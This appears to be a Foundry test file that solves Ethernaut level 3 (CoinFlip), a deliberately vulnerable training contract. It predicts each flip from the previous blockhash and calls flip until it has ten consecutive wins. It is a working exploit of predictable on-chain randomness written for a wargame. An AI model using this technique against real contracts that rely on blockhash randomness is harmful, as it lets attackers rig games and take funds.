// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level3 {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

contract Level3Test is EthernautTest {
    function testLevel3() public {
        _createLevel("3");
        Level3 levelInstance3 = Level3(levelInstance["3"]);
        // Fork to lower block number so we don't run out of fresh blockhashes
        vm.roll(100);

        while (levelInstance3.consecutiveWins() < 10) {
            // We can calculate the guess based on the blockhash
            bool guess = uint256(blockhash(block.number - 1))
                / 57896044618658097711785492504343953926634992332820282019728792003956564819968 == 1 ? true : false;
            console2.logBytes32(blockhash(block.number - 1));
            // Correctly guess
            levelInstance3.flip(guess);
            // Increment the block number as if we are waiting for the next block
            vm.roll(100 + levelInstance3.consecutiveWins());
        }

        require(_submitLevel("3"));
    }
}
